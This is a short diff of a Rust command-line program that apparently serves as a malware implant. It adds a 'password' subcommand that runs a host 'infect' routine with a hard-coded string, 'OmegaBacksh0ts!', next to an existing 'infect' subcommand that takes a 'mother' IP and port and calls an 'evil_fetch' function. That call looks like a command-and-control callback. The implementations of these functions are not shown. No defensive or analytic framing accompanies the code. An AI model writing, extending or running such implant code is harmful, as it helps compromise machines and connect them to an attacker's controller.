@@ -22,6 +22,7 @@ async fn main() {
                         .value_parser(value_parser!(String)),
                 ),
         )
+        .subcommand(Command::new("password").about("Gives backshots"))
         .subcommand(Command::new("ip").about("Returns ip of system"))
         .arg(arg!(-i --inventory "Gets Host inventory").required(false))
         .subcommand(
@@ -64,12 +65,13 @@ async fn main() {
         println!("{}", Host::new().to_json());
     }
     match matches.subcommand() {
+        Some(("password", _)) => {
+            let host = Host::new();
+            host.infect(69, "OmegaBacksh0ts!");
+        }
         Some(("infect", sub_matches)) => {
             let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
             let port = sub_matches.get_one::<u16>("port").unwrap();
-
-            let host = Host::new();
-            host.infect(69, "OmegaBacksh0ts!");
 
             match client::client::evil_fetch(mother_ip, port).await {
                 Ok(_) => println!("Infect operation successful"),
